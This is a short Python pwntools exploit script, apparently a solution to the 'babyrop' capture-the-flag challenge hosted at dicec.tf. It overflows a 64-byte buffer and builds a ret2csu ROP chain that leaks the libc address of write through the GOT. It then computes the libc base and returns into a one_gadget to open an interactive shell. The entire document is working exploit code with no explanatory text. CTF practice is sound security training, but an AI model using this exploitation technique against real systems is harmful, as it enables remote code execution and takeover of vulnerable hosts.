from pwn import *

elf = ELF("./babyrop")
#r = process(["./babyrop"])
r = remote("dicec.tf", 31924)

payload = b"a" * 64 + p64(0x0)
payload += p64(0x4011CA) + p64(0x0) + p64(0x1) + p64(0x1) + p64(elf.got['write']) + p64(0x8) + p64(elf.got['write']) # r13,r14,r15
payload += p64(0x4011B0) + p64(0x0) + p64(0x0) + p64(0x405000) + p64(0x0) + p64(0x0) + p64(0x0) + p64(0x0) + p64(0x401136)

r.sendlineafter(": ", payload)
leak = u64(r.recv(8))
log.info("Libc write leak: %x" % leak)

leak -= 0x1111d0
log.info("Libc @ %x" % leak)

# -> libc6_2.31-0ubuntu9.1_amd64 
payload = b"a" * 64 + p64(0x405000)
payload += p64(leak + 0xe6c7e) # one_gadget
r.sendline(payload)
r.interactive()
